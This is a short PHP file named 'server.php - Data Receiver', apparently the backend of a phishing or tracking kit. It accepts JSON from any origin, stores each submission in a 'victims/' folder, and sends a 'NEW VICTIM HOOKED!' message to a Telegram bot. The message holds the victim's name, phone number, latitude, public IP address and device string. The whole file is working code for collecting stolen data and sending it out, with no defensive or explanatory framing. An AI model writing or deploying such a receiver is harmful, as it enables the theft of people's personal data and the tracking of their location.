<?php
// server.php - Data Receiver
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $filename = 'victims/' . date('Y-m-d_H-i-s') . '_' . uniqid() . '.json';
    
    // Save to file
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    
    // Also log to Telegram
    $telegram_token = 'YOUR_BOT_TOKEN';
    $chat_id = 'YOUR_CHAT_ID';
    
    $message = "🎯 NEW VICTIM HOOKED!\n";
    $message .= "Name: " . ($data['personal']['nama'] ?? 'Unknown') . "\n";
    $message .= "Phone: " . ($data['personal']['phone'] ?? 'Unknown') . "\n";
    $message .= "Location: " . ($data['location']['latitude'] ?? 'Unknown') . "\n";
    $message .= "IP: " . ($data['network']['publicIP'] ?? 'Unknown') . "\n";
    $message .= "Device: " . substr($data['device']['userAgent'] ?? 'Unknown', 0, 50);
    
    file_get_contents("https://api.telegram.org/bot{$telegram_token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message));
    
    echo json_encode(['status' => 'success', 'message' => 'Data received']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>